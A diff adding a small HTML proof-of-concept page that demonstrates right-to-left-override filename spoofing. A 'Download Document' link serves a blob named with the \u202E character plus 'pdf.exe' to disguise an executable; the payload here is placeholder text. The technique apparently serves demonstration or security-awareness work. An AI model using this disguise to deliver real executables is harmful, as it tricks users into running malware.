@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>RLO Filename Spoofing</title>
+  </head>
+  <body>
+    <h2>RLO Filename Spoofing</h2>
+    <p>Click the link below to download a disguised executable file:</p>
+
+    <a id="spoofedDownload" href="#">Download Document</a>
+
+    <script>
+      // Construct misleading filename using RLO character
+      const spoofedFilename = "\u202Epdf.exe";
+
+      // Create fake payload (could be real EXE binary in real-world use)
+      const blob = new Blob(["Fake executable content"], {
+        type: "application/octet-stream"
+      });
+
+      const a = document.getElementById("spoofedDownload");
+      a.href = URL.createObjectURL(blob);
+      a.download = spoofedFilename;
+    </script>
+  </body>
+</html>
